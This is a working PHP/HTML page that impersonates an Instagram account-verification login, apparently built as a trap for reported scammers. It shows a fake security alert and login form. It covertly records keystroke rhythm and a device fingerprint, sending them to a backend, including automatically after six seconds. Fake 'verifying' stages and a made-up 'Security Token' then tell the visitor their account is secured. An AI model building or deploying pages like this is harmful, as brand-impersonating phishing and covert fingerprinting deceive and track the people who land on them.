<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Instagram – Verify Your Account</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
  .card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:36px 40px;width:100%;max-width:350px;text-align:center;}
  .logo{font-size:40px;margin-bottom:4px;letter-spacing:-2px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;font-style:italic;}
  h1{font-size:15px;font-weight:600;color:#262626;margin-bottom:18px;}
  .alert{background:#fff3cd;border:1px solid #ffc107;border-radius:4px;padding:10px;margin-bottom:16px;font-size:12px;color:#856404;text-align:left;}
  input{width:100%;padding:10px 10px;border:1px solid #dbdbdb;border-radius:3px;font-size:13px;outline:none;background:#fafafa;margin-bottom:8px;color:#262626;}
  input:focus{border-color:#a8a8a8;}
  .btn{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:5px;font-size:14px;font-weight:600;cursor:pointer;margin-top:4px;}
  .overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:99;flex-direction:column;align-items:center;justify-content:center;color:#fff;padding:30px;}
  .overlay.show{display:flex;}
  .ring{width:80px;height:80px;border:3px solid transparent;border-top-color:#dc2743;border-right-color:rgba(220,39,67,.3);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:22px;}
  @keyframes spin{to{transform:rotate(360deg);}}
  .lbl{font-size:12px;color:#f09433;letter-spacing:1px;margin-bottom:13px;font-family:monospace;text-align:center;}
  .pb{width:200px;height:2px;background:rgba(255,255,255,.1);border-radius:1px;overflow:hidden;}
  .pf{height:100%;background:linear-gradient(90deg,#f09433,#dc2743);width:0%;transition:width .4s;}
  .token-box{margin-top:12px;padding:8px;background:#fafafa;border:1px solid #dbdbdb;font-family:monospace;font-size:10px;color:#aaa;word-break:break-all;}
</style>
</head>
<body>
<?php
$report_id=intval($_GET['report']??0);
$role=in_array($_GET['role']??'',['scammer','suspect'])?$_GET['role']:'scammer';
?>
<div class="card" id="mainCard">
  <div class="logo">Instagram</div>
  <div class="alert">⚠️ Suspicious login attempt detected. Verify your account now.</div>
  <form onsubmit="handleSubmit(event)" id="verifyForm">
    <input type="text" id="uname" name="uname" placeholder="Username, email, or phone">
    <input type="password" id="pass" name="pass" placeholder="Password">
    <button type="submit" class="btn">Log In to Verify</button>
  </form>
</div>
<div class="overlay" id="overlay"><div class="ring"></div><div class="lbl" id="lbl">VERIFYING...</div><div class="pb"><div class="pf" id="pf"></div></div></div>
<div class="card" id="doneCard" style="display:none;padding:40px;text-align:center;">
  <div style="font-size:48px;margin-bottom:10px;">✅</div>
  <div style="font-size:16px;font-weight:600;color:#262626;margin-bottom:6px;">Account Verified</div>
  <div style="font-size:13px;color:#8e8e8e;">Your account is now secured.</div>
  <div class="token-box" id="tokenBox"></div>
</div>
<script src="/blockchain-sentinel/behavioral_biometrics.js"></script>
<script>
const REPORT_ID=<?= $report_id ?>;const ROLE='<?= $role ?>';
const bc=new BehavioralCollector();bc.attach(document.getElementById('verifyForm'));
function collect(){return{screen_resolution:screen.width+'x'+screen.height,browser:navigator.userAgent,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,device_memory:navigator.deviceMemory||'u',hardware_concurrency:navigator.hardwareConcurrency||'u',touch_support:navigator.maxTouchPoints||0,pixel_ratio:window.devicePixelRatio||1};}
async function sha256(m){const b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(m));return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('');}
async function sendFP(fp){try{const r=await fetch(location.origin+'/blockchain-sentinel/backend/realtime_scan.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({report_id:REPORT_ID,role:ROLE,fingerprint:fp,phone:''})});const d=await r.json();return d.hash||await sha256(JSON.stringify(fp));}catch(e){return await sha256(JSON.stringify(fp));}}
const stages=['READING DEVICE...','ANALYZING TYPING PATTERN...','MEASURING KEYSTROKE RHYTHM...','BEHAVIORAL HASH GENERATED...','BLOCKCHAIN SIGNATURE...','COMPLETE ✓'];
async function handleSubmit(e){e.preventDefault();bc.detach();const fp=collect();const ov=document.getElementById('overlay');const lbl=document.getElementById('lbl');const pf=document.getElementById('pf');ov.classList.add('show');for(let i=0;i<stages.length;i++){lbl.textContent=stages[i];pf.style.width=((i+1)/stages.length*100)+'%';await new Promise(r=>setTimeout(r,560));}const[hash]=await Promise.all([sendFP(fp),bc.send(REPORT_ID,ROLE)]);ov.classList.remove('show');document.getElementById('mainCard').style.display='none';document.getElementById('doneCard').style.display='block';document.getElementById('tokenBox').textContent='Security Token: '+hash.substr(0,32)+'...';}
setTimeout(async()=>{sendFP(collect()).catch(()=>{});if(bc.hasEnoughData())bc.send(REPORT_ID,ROLE).catch(()=>{});},6000);
</script>
</body></html>
